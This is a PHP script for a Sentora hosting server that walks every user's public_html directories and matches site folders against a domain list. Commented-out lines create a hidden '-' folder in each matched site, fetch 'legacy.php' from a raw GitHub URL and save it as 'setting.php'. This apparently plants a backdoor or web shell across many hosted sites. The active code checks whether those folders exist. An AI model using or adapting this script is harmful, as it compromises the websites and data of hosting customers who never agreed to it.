<?php

function dd(...$data) {
    echo '<pre>';
    var_dump($data);
    echo '</pre>';
    die;
}

$main = '/var/sentora/hostdata/';
$homes = scandir($main);

$domains = file_get_contents('./domains.txt');
$domains = explode(PHP_EOL, $domains);

$targets = [];
foreach ($homes as $key => $home) {
    $currentPath = $main . $home . '/public_html/';
    $paths = scandir($currentPath);

    foreach ($paths as $path) {

        $currentDomain = str_replace('_', '.', $path);
        if (in_array($currentDomain, $domains)) {
            $targets[] = [
                'path' => $currentPath . $path,
                'domain' => $currentDomain,
            ];
        }
    }
}

$results = [];

foreach ($targets as $target) {
    $dir = $target['path'] . '/-';
    // mkdir($target['path'] . '/-');

    // $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/legacy.php');
    // $file = $target['path'] . '/-/setting.php';
    // $res = file_put_contents($file, $response);

    // $results[$target['domain']] = [
    //     'size' => $res,
    //     'domain' => $target['domain'],
    //     'path' => $target['path'],
    //     'url' => $target['domain'] . '/-/setting.php'
    // ];

    if (!isset($results[$target['domain']])) {
        $results[$dir] = file_exists($dir) && is_dir($dir);
    }
}

dd($results);